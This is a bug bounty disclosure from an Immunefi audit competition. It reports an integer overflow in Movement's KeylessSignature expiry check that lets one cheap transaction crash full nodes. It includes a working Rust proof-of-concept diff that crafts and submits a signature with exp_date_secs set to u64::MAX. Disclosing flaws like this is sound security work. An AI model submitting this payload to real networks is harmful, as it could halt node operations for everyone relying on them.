# #42934 \[BC-High] Improper input validation in KeylessSignature causes full-node panic

**Submitted on Mar 29th 2025 at 18:16:50 UTC by @dustincha for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42934
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement-aptos-core/tree/main>
* **Impacts:**
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network

## Description

## Brief/Intro

The `KeylessSignature` implementation lacks proper input validation for certain fields. This allows an attacker to craft a malicious transaction that, when submitted to the Movement network, causes all full nodes to panic. The attack requires no special privileges—only a minimal amount of funds to cover transaction fees. By leveraging the Movement SDK, an attacker can easily submit the malformed transaction. Once triggered, the attack causes a complete halt of the network: full nodes become unresponsive, and no further transactions can be processed.

## Vulnerability Details

The vulnerability is in how keyless signatures are validated.\
Specifically:

1. <https://github.com/immunefi-team/attackathon-movement-aptos-core/blob/627b4f9e0b63c33746fa5dae6cd672cbee3d8631/aptos-move/aptos-vm/src/keyless\\_validation.rs#L165>

```
 sig.verify_expiry(&onchain_timestamp_obj).map_err(|_| {
```

sig is the transaction signature defined as a `KeylessSignature` type

2. <https://github.com/immunefi-team/attackathon-movement-aptos-core/blob/627b4f9e0b63c33746fa5dae6cd672cbee3d8631/types/src/keyless/mod.rs#L151>

```
let expiry_time = seconds_from_epoch(self.exp_date_secs);
```

`exp_date_secs` is fully attacker-controlled.

3. <https://github.com/immunefi-team/attackathon-movement-aptos-core/blob/627b4f9e0b63c33746fa5dae6cd672cbee3d8631/types/src/keyless/mod.rs#L369> --> Integer overflow during the calculation

Submitting malformed KeylessSignature data via a transaction leads to a panic during validation.

## Impact Details

All full nodes panic and stop processing transactions

## Proof of Concept

## Proof of Concept

To demonstrate the vulnerability, apply the included git diff which adds a failing test using a malformed KeylessSignature.

This patch adds a test named `test_keyless_tx` that constructs and submits a malformed keyless transaction. When processed, it triggers a panic in the node.

```
git apply poc.diff
cd networks/movement/movement-client/
cargo test test_keyless_tx -- --nocapture
```

poc.diff:

```
diff --git a/networks/movement/movement-client/src/tests/mod.rs b/networks/movement/movement-client/src/tests/mod.rs
index 0800555f8..e4a29cf2d 100644
--- a/networks/movement/movement-client/src/tests/mod.rs
+++ b/networks/movement/movement-client/src/tests/mod.rs
@@ -1,34 +1,57 @@
 // pub mod alice_bob;
 pub mod indexer_stream;
-use crate::load_soak_testing::{execute_test, init_test, ExecutionConfig, Scenario, TestKind};
+
 use crate::{
 	coin_client::CoinClient,
+	load_soak_testing::{execute_test, init_test, ExecutionConfig, Scenario, TestKind},
 	rest_client::{
 		aptos_api_types::{TransactionOnChainData, ViewFunction},
 		Client, FaucetClient,
 	},
 	transaction_builder::TransactionBuilder,
-	types::{chain_id::ChainId, LocalAccount},
 };
+
+use aptos_sdk::{
+	crypto::{
+		ed25519::{Ed25519PrivateKey, Ed25519PublicKey},
+		PrivateKey, SigningKey, Uniform, ValidCryptoMaterialStringExt,
+	},
+	move_types::{
+		identifier::Identifier,
+		language_storage::{ModuleId, TypeTag},
+	},
+	types::{
+		account_address::AccountAddress,
+		chain_id::ChainId,
+		keyless::{
+			EphemeralCertificate, IdCommitment, KeylessPublicKey, KeylessSignature, OpenIdSig,
+			Pepper, TransactionAndProof,
+		},
+		transaction::{
+			authenticator::{
+				AccountAuthenticator, AnyPublicKey, AnySignature, AuthenticationKey,
+				EphemeralPublicKey, EphemeralSignature, SingleKeyAuthenticator,
+				TransactionAuthenticator,
+			},
+			EntryFunction, RawTransaction, Script, SignedTransaction, TransactionPayload,
+		},
+		LocalAccount,
+	},
+};
+
 use anyhow::Context;
-use aptos_sdk::crypto::ed25519::Ed25519PrivateKey;
-use aptos_sdk::crypto::ValidCryptoMaterialStringExt;
-use aptos_sdk::move_types::identifier::Identifier;
-use aptos_sdk::move_types::language_storage::ModuleId;
-use aptos_sdk::types::account_address::AccountAddress;
-use aptos_sdk::types::transaction::authenticator::AuthenticationKey;
-use aptos_sdk::types::transaction::EntryFunction;
-use aptos_sdk::types::transaction::TransactionPayload;
-use aptos_sdk::{crypto::ed25519::Ed25519PublicKey, move_types::language_storage::TypeTag};
 use buildtime_helpers::cargo::cargo_workspace;
 use commander::run_command;
 use once_cell::sync::Lazy;
 use serde::{de::DeserializeOwned, Deserialize};
-use std::path::PathBuf;
-use std::str::FromStr;
-use std::time::{SystemTime, UNIX_EPOCH};
-use std::{fs, sync::Arc};
-use std::{thread, time};
+use std::{
+	fs,
+	path::PathBuf,
+	str::FromStr,
+	sync::Arc,
+	thread,
+	time::{self, SystemTime, UNIX_EPOCH},
+};
 use url::Url;
 
 static SUZUKA_CONFIG: Lazy<movement_config::Config> = Lazy::new(|| {
@@ -185,6 +208,130 @@ async fn test_example_interaction() -> Result<(), anyhow::Error> {
 	Ok(())
 }
 
+#[tokio::test]
+async fn test_keyless_tx() -> Result<(), anyhow::Error> {
+	let rest_client = Client::new(NODE_URL.clone());
+	let faucet_client = FaucetClient::new(FAUCET_URL.clone(), NODE_URL.clone());
+	let coin_client = CoinClient::new(&rest_client);
+
+	// Create Alice's account
+	let mut alice = LocalAccount::generate(&mut rand::rngs::OsRng);
+
+	// Fund Alice's account
+	faucet_client
+		.fund(alice.address(), 100_000_000)
+		.await
+		.context("Failed to fund Alice's account")?;
+
+	// Print initial balance
+	println!("\n=== Initial Balance ===");
+	println!(
+		"Alice: {:?}",
+		coin_client
+			.get_account_balance(&alice.address())
+			.await
+			.context("Failed to get Alice's account balance")?
+	);
+
+	// Exploit from here
+
+	// Set up transaction parameters
+	let max_gas_amount: u64 = 5_000;
+	let gas_unit_price: u64 = 100;
+	let timeout_secs: u64 = 10;
+	let chain_id = ChainId::new(4); // Adjust chain ID as needed
+
+	let expiration_timestamp_secs = SystemTime::now()
+		.duration_since(UNIX_EPOCH)
+		.unwrap()
+		.as_secs()
+		+ timeout_secs;
+
+	// Build transaction payload
+	let payload = TransactionPayload::Script(Script::new(vec![0], vec![], vec![]));
+
+	// Create raw transaction
+	let raw_txn = RawTransaction::new(
+		alice.address(),
+		alice.sequence_number(),
+		payload,
+		max_gas_amount,
+		gas_unit_price,
+		expiration_timestamp_secs,
+		chain_id,
+	);
+
+	// Set up keyless public key
+	let any_public_key = AnyPublicKey::Keyless {
+		public_key: KeylessPublicKey {
+			iss_val: "test.oidc.provider".to_string(),
+			idc: IdCommitment::new_from_preimage(
+				&Pepper::from_number(0x1337),
+				"aud",
+				"uid_key",
+				"uid_val",
+			)
+			.expect("Failed to create IdCommitment"),
+		},
+	};
+
+	// Create transaction and proof container
+	let txn_and_proof = TransactionAndProof {
+		message: raw_txn.clone(),
+		proof: None,
+	};
+
+	// Generate test keys and signature
+	let private_key = Ed25519PrivateKey::generate_for_testing();
+	let public_key: Ed25519PublicKey = private_key.public_key();
+	let signature = private_key
+		.sign(&txn_and_proof)
+		.expect("Failed to sign raw_txn");
+
+	// Create keyless signature for attack0
+	let any_signature = AnySignature::Keyless {
+		signature: KeylessSignature {
+			cert: EphemeralCertificate::OpenIdSig(OpenIdSig {
+				jwt_sig: vec![],
+				jwt_payload_json: "jwt_payload_json".to_string(),
+				uid_key: "uid_key".to_string(),
+				epk_blinder: b"epk_blinder".to_vec(),
+				pepper: Pepper::from_number(0x1337),
+				idc_aud_val: None,
+			}),
+			jwt_header_json: "jwt_header_json".to_string(),
+			exp_date_secs: u64::MAX, // Overflow here
+			ephemeral_pubkey: EphemeralPublicKey::ed25519(public_key),
+			ephemeral_signature: EphemeralSignature::ed25519(signature),
+		},
+	};
+
+	// Build an authenticator
+	let authenticator = TransactionAuthenticator::SingleSender {
+		sender: AccountAuthenticator::SingleKey {
+			authenticator: SingleKeyAuthenticator::new(any_public_key, any_signature),
+		},
+	};
+
+	// Create and submit the signed transaction
+	let signed_transaction = SignedTransaction::new_signed_transaction(raw_txn, authenticator);
+	rest_client
+		.submit(&signed_transaction)
+		.await
+		.context("Submit failed")?;
+
+	println!("\n=== Try to get balance after exploit ===");
+	println!(
+		"Alice: {:?}",
+		coin_client
+			.get_account_balance(&alice.address())
+			.await
+			.context("Failed to get Alice's account balance")?
+	);
+
+	Ok(())
+}
+
 #[derive(Debug, Deserialize)]
 struct Config {
 	profiles: Profiles,
```
